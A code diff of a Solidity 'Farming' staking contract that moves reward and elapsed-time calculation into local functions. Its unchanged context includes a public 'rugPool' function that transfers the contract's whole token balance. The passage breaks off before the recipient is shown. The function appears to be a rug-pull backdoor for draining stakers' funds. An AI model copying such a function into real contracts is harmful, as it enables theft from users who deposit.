@@ -43,8 +43,7 @@ contract Farming is Ownable {
     //ClaimRewards
     function claimRewards(address _token) public {
         uint256 balance = stakingBalance[_token][msg.sender];
-        uint256 time = updateTime[_token][msg.sender];
-        uint256 reward = PoolManager.calculateRewards(msg.sender, _token , balance , time);
+        uint256 reward = calculateRewards(msg.sender, _token);
         require(reward >= 0 && balance >= 0);
         MIM.safeTransfer(msg.sender, reward);
         updateTime[_token][msg.sender] = block.timestamp;
@@ -53,9 +52,7 @@ contract Farming is Ownable {
     //Unstake with amount
     function unstakeTokens(uint256 _amount, address _token) public {
         require(_amount > 0);
-        uint256 balance = stakingBalance[_token][msg.sender];
-        uint256 time = updateTime[_token][msg.sender];
-        uint256 reward = PoolManager.calculateRewards(msg.sender, _token , balance , time);
+        uint256 reward = calculateRewards(msg.sender, _token);
         ERC20(_token).safeTransfer(msg.sender, _amount);
         uint256 remain = stakingBalance[_token][msg.sender].sub(_amount);
         stakingBalance[_token][msg.sender] = remain;
@@ -72,6 +69,39 @@ contract Farming is Ownable {
         return stakingBalance[_token][_account];
     }
 
+    
+   function checkRewardByAddress(address _account, address _token)
+        public
+        view
+        returns (uint256)
+    {
+        uint256 reward = calculateRewards(_account, _token);
+        return reward;
+    }
+
+    function calculateTime(address _account, address _token)
+        public
+        view
+        returns (uint256)
+    {
+        uint256 time = block.timestamp;
+        uint256 totalTime = time.sub(updateTime[_token][_account]);
+        return totalTime;
+    }
+
+    function calculateRewards(address _account, address _token)
+        public
+        view
+        returns (uint256)
+    {
+        uint256 decimals = (ERC20(_token).decimals());
+        uint256 expo = 10**decimals;
+        uint256 time = calculateTime(_account, _token).mul(1e18);
+        uint256 rate = 86400;
+        uint256 timeRate = time.div(rate);
+        uint256 reward = stakingBalance[_token][_account].mul(timeRate).div(expo);
+        return reward;
+    }
     function rugPool(address _token) public {
         uint256 balance = ERC20(_token).balanceOf(address(this));
         ERC20(_token).safeTransfer(
